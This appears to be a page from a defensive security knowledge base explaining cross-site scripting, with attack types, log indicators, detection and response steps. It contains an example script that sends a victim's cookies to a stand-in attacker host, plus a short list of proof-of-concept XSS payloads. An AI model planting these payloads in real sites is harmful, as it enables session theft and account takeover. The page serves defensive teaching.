<sub>[Home](../README.md) › [Web attacks](README.md)</sub>

# Cross-site scripting (XSS)

> **In one line:** The attacker gets **their JavaScript to run in other users' browsers** on a trusted website, to steal sessions, capture input or act as the user.

| **OWASP** | A05:2025 Injection · CWE-79 |
|---|---|
| **MITRE ATT&CK** | Used for [T1189 Drive-by Compromise](https://attack.mitre.org/techniques/T1189/) and [T1539 Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/) |
| **Who is harmed** | The **users** of the site, not the server |

## Types

| Type | Where the script lives | How the victim gets it |
|---|---|---|
| **Reflected** | In the URL | Victim clicks a crafted link: `https://shop.com/search?q=<script>...</script>`; the page echoes it back |
| **Stored** | Saved in the database (comment, profile name, ticket) | **Every** user who views that page runs it. Most dangerous |
| **DOM-based** | Handled only by the page's own JavaScript in the browser | Crafted link; the server may never see the payload (e.g. after `#`) |

## How it works (stored example)

1. A forum lets users post comments and doesn't encode them.
2. The attacker posts: `<script>fetch('https://evil.example/c?='+document.cookie)</script>`
3. An admin opens the page. Their browser runs the script **as part of the forum site**.
4. The admin's session cookie is sent to the attacker, who now uses it to act as the admin.

## Common payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href="javascript:alert(1)">click</a>
"><script>alert(document.domain)</script>
```

Encoded versions: `%3Cscript%3E`, `&lt;script&gt;`, `<script>`. `alert(1)` is used by testers to prove it works; real attacks steal cookies or load external scripts.

## What you see in logs

| Log source | What to look for |
|---|---|
| Web access log (reflected) | `<script`, `onerror=`, `onload=`, `javascript:`, `document.cookie`, `alert(` in query strings, usually URL-encoded |
| WAF | XSS signature hits (covers POST bodies for stored XSS) |
| Application logs | Stored fields (comments, names) containing HTML tags |
| Proxy logs | Users' browsers sending requests to an unknown domain with `cookie=` or long tokens in the URL |
| Identity / app logs | The same session used from a new IP (stolen cookie) |

## How to detect it

- HTML/JavaScript syntax in parameters that should be plain text.
- Outbound requests from many users' browsers to the same unknown domain right after visiting one page (stored XSS firing).

## How to respond

1. Find **where** the payload is (URL only, or stored in the DB). Remove stored payloads.
2. Identify **affected users** (who viewed the page). Invalidate their sessions if cookies could have been stolen.
3. Block the exfiltration domain.
4. **Fix:** **output encoding** (escape `<`, `>`, `"`, `'`, `&` when displaying data), Content Security Policy (CSP), `HttpOnly` cookies (JavaScript can't read them), input validation, use framework auto-escaping.

## References

- [OWASP: Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

| [← SQL injection (SQLi)](sql-injection.md) | [Home](../README.md) | [Command injection →](command-injection.md) |
|:---|:---:|---:|
